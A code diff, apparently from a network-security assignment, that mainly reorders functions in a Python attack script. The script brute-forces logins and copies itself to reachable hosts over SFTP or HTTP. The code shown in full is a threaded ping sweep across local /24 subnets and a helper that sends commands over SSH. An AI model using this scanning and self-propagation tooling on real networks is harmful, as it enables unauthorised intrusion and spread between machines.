@@ -195,29 +195,6 @@ def bruteforce_web(ip, port, username, passwords):
     return response
 
 
-# Reads the contents of a specified file to a list. If the provided file is empty an error message will be provided
-# and the script terminated.
-# Return File contents in a list
-def read_file_from_list(file):
-    with open(file) as reader:
-        file_contents_list = reader.read().splitlines()
-
-    if not file_contents_list:
-        print("File %s did not have any content" % file)
-        exit()
-
-    return file_contents_list
-
-
-# Checks if a IP address is reachable by sending out an Echo Ping. The source IP of the request and the timeout
-# are optional. If no source IP is provided then scapy will figure out the source IP. If no timeout is provided
-# then a timeout of 2 is set.
-# Return True if the IP address replied to the Echo Ping False otherwise
-def is_reachable(dst_ip, src_ip=None, timeout=2):
-    ans = sr1(IP(src=src_ip, dst=dst_ip, ttl=64) / ICMP(), timeout=timeout)
-    return ans is not None
-
-
 # Transfers a file to a specified IP address with it's known username and password. Based on the port shown to be
 # open the file will be transferred over SFTP or HTTP.
 # Return True if the file(s) were deployed successfully False otherwise
@@ -304,31 +281,6 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
         client.close()
 
 
-# Sends a command over the provided channel. If required will check the response to the provided command to see if it
-# is the expected reply.
-# Return True if command successful (and output is expected if required) False otherwise
-def send_command_over_channel(channel, command, check_output=False, output=None):
-    try:
-        channel.send(command)
-
-        counter = 0
-        while not channel.recv_ready():
-            if counter >= 5:
-                return False
-
-            time.sleep(0.1)
-            counter = counter + 1
-
-        command_response = channel.recv(1024)
-        if check_output and encode_in_ascii(output) not in command_response:
-            return False
-
-        time.sleep(0.1)
-        return True
-    except socket.error:
-        return False
-
-
 # Transfers a file using HTTP. Will either deploy a single file if -d option is used otherwise -P and -L is used
 # and the script will deploy itself and it's attached file (password file). If using the self propagation feature and
 # the provided user is found to not have sudo access then the function will terminate.
@@ -405,6 +357,30 @@ def transfer_file_with_http_server(ip, username, password, target_directory, sel
 
     return True
 
+# Sends a command over the provided channel. If required will check the response to the provided command to see if it
+# is the expected reply.
+# Return True if command successful (and output is expected if required) False otherwise
+def send_command_over_channel(channel, command, check_output=False, output=None):
+    try:
+        channel.send(command)
+
+        counter = 0
+        while not channel.recv_ready():
+            if counter >= 5:
+                return False
+
+            time.sleep(0.1)
+            counter = counter + 1
+
+        command_response = channel.recv(1024)
+        if check_output and encode_in_ascii(output) not in command_response:
+            return False
+
+        time.sleep(0.1)
+        return True
+    except socket.error:
+        return False
+
 
 # Return The IP address of the host running the script on the particular interface
 def get_server_ip_from_ip(ip):
@@ -419,6 +395,67 @@ def get_server_ip_from_ip(ip):
             break
 
     return server_ip
+
+
+# Reads the contents of a specified file to a list. If the provided file is empty an error message will be provided
+# and the script terminated.
+# Return File contents in a list
+def read_file_from_list(file):
+    with open(file) as reader:
+        file_contents_list = reader.read().splitlines()
+
+    if not file_contents_list:
+        print("File %s did not have any content" % file)
+        exit()
+
+    return file_contents_list
+
+
+# Will scan for all active IP addresses across all interfaces the attacker can see
+# Return List of all IP addresses that replied
+def scan_for_active_ips():
+    interfaces = get_if_list()
+    active_ips = []
+    for interface in interfaces:
+        active_ips.extend(scan_against_interface(interface))
+
+    return active_ips
+
+
+# Gets the IP Address of the interface, extracts the base IP from the interface IP i.e. XXX.YYY.ZZZ. and sends an Echo
+# Request to each possible IP in the /24 Network from 1 to 254 with the base IP i.e XXX.YYY.ZZZ.1 -> XXX.YYY.ZZZ.254.
+def scan_against_interface(interface):
+    src_ip = get_if_addr(interface)
+    base_ip = src_ip[0: (src_ip.rfind('.') + 1)]
+    replies_list = []
+
+    # Calls the send function over 20 threads. The range option will provide the final octet value for the ping request.
+    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+        executor.map(send(src_ip, base_ip, replies_list), range(1, 255))
+
+    return replies_list
+
+
+# Return A reference to send_icmp_request
+def send(src_ip, base_ip, replies_list):
+    # Sends an Echo Request to the Networks base IP concatenated with a particular IP for the final octet.
+    # The src_ip is set in the Echo Request as the source. If an Echo Reply is not received in 4 seconds then the
+    # request times out (Timeout is longer in case of congestion when threaded).
+    def send_icmp_request(last_ip_octal):
+        dst_ip = base_ip + str(last_ip_octal)
+        if is_reachable(dst_ip, src_ip=src_ip, timeout=4):
+            replies_list.append(dst_ip)
+
+    return send_icmp_request
+
+
+# Checks if a IP address is reachable by sending out an Echo Ping. The source IP of the request and the timeout
+# are optional. If no source IP is provided then scapy will figure out the source IP. If no timeout is provided
+# then a timeout of 2 is set.
+# Return True if the IP address replied to the Echo Ping False otherwise
+def is_reachable(dst_ip, src_ip=None, timeout=2):
+    ans = sr1(IP(src=src_ip, dst=dst_ip, ttl=64) / ICMP(), timeout=timeout)
+    return ans is not None
 
 
 # Deploys the script and provided deployment file to a HTTP server. Moves these files to a new directory to
@@ -513,49 +550,11 @@ def verify_file_exists(file):
         exit()
 
 
-# Return The directory to deploy files to. Follows the pattern that 10.0.0.2 => server_1, 10.0.0.3 => server_2
+# Return The directory to deploy files to. Assumes the pattern that 10.0.0.2 => server_1, 10.0.0.3 => server_2
 def get_target_directory(ip, username):
     last_ip_octal = ip[ip.rfind('.') + 1:]
     server_number = int(last_ip_octal) - 1
     return "/home/%s/assign_2/server_%d" % (username, server_number)
-
-
-# Will scan for all active IP addresses across all interfaces the attacker can see
-# Return List of all IP addresses that replied
-def scan_for_active_ips():
-    interfaces = get_if_list()
-    active_ips = []
-    for interface in interfaces:
-        active_ips.extend(scan_against_interface(interface))
-
-    return active_ips
-
-
-# Gets the IP Address of the interface, extracts the base IP from the interface IP i.e. XXX.YYY.ZZZ. and sends an Echo
-# Request to each possible IP in the /24 Network from 1 to 254 with the base IP i.e XXX.YYY.ZZZ.1 -> XXX.YYY.ZZZ.254.
-def scan_against_interface(interface):
-    src_ip = get_if_addr(interface)
-    base_ip = src_ip[0: (src_ip.rfind('.') + 1)]
-    replies_list = []
-
-    # Calls the send function over 20 threads. The range option will provide the final octet value for the ping request.
-    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
-        executor.map(send(src_ip, base_ip, replies_list), range(1, 255))
-
-    return replies_list
-
-
-# Return A reference to send_icmp_request
-def send(src_ip, base_ip, replies_list):
-    # Sends an Echo Request to the Networks base IP concatenated with a particular IP for the final octet.
-    # The src_ip is set in the Echo Request as the source. If an Echo Reply is not received in 4 seconds then the
-    # request times out.
-    def send_icmp_request(last_ip_octal):
-        dst_ip = base_ip + str(last_ip_octal)
-        if is_reachable(dst_ip, src_ip=src_ip, timeout=4):
-            replies_list.append(dst_ip)
-
-    return send_icmp_request
 
 
 # Return encoded version of the String in ascii
